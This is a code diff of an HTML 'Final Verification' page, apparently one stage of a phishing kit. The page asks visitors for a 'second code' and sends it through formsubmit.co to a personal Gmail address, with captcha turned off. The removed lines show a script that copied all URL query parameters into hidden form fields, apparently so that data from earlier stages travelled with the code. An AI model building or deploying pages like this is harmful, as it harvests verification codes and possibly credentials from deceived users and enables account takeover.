@@ -7,31 +7,14 @@
 <body>
   <div class="container">
     <h2>Final Verification</h2>
-    <p>Enter the second code to complete:</p>
-    <form action="https://formsubmit.co/allenshaw302@gmail.com" method="POST" id="finalForm">
-      <label>Second Code: *</label><br>
-      <input type="text" name="code2" required><br>
+    <form action="https://formsubmit.co/allenshaw302@gmail.com" method="POST">
+      <label>Second Code: *</label><br><input type="text" name="code2" required><br>
 
       <input type="hidden" name="_next" value="thankyou.html">
       <input type="hidden" name="_captcha" value="false">
-
-      <div id="hiddenFields"></div>
-
       <input type="submit" value="Finish">
     </form>
   </div>
-
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const hiddenFieldsDiv = document.getElementById('hiddenFields');
-
-    for (const [key, value] of params.entries()) {
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = key;
-      input.value = value;
-      hiddenFieldsDiv.appendChild(input);
-    }
-  </script>
 </body>
 </html>
+
